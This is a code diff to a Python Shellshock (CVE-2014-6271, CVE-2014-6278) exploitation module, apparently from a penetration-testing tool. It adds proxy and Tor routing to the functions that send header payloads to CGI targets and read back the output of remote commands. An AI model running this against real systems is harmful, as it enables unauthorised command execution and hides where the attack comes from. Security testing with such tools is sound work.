@@ -10,7 +10,8 @@ import urllib2
 from src.utils import menu
 from src.utils import logs
 from src.utils import settings
-
+from src.core.requests import tor
+from src.core.requests import proxy
 from src.thirdparty.colorama import Fore, Back, Style, init
 
 from src.core.shells import bind_tcp
@@ -40,6 +41,7 @@ else:
       readline_error = True
 pass
 
+default_user_agent = menu.options.agent
 
 """
 This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in Apache CGI.
@@ -667,9 +669,20 @@ def shellshock_handler(url, http_request_method, filename):
 
         header = {check_header : payload}
         request = urllib2.Request(url, None, header)
+        if check_header == "User-Agent":
+          menu.options.agent = payload
+        else:
+          menu.options.agent = default_user_agent  
+        log_http_headers.do_check(request)
         log_http_headers.check_http_traffic(request)
-        response = urllib2.urlopen(request)
-
+        # Check if defined any HTTP Proxy.
+        if menu.options.proxy:
+          response = proxy.use_proxy(request)
+        # Check if defined Tor.
+        elif menu.options.tor:
+          response = tor.use_tor(request)
+        else:
+          response = urllib2.urlopen(request)
         percent = ((i*100)/total)
         float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
         
@@ -916,9 +929,16 @@ def cmd_exec(url, cmd, cve, check_header, filename):
         sys.stdout.write("\n" + settings.print_payload(payload)+ "\n")
       header = { check_header : payload }
       request = urllib2.Request(url, None, header)
+      log_http_headers.do_check(request)
       log_http_headers.check_http_traffic(request)
-      # Checking the HTTP requests.s - Verbose >= 2
-      response = urllib2.urlopen(request)
+      # Check if defined any HTTP Proxy.
+      if menu.options.proxy:
+        response = proxy.use_proxy(request)
+      # Check if defined Tor.
+      elif menu.options.tor:
+        response = tor.use_tor(request)
+      else:
+        response = urllib2.urlopen(request)
       shell = response.read().rstrip().replace('\n',' ')
       shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
       shell = ''.join(shell)
